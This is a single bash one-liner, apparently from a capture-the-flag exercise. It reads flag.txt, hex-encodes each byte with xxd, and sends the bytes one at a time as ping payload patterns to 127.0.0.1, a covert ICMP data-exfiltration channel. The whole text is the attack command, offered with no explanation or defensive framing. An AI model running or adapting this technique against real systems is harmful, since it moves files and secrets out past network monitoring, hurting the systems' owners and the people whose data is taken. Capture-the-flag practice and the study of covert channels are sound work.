CMD="cat flag.txt"; OUTPUT=$($CMD | xxd -p -c 1); for i in $OUTPUT[@]; do ping -c 1 -p $i 127.0.0.1; done
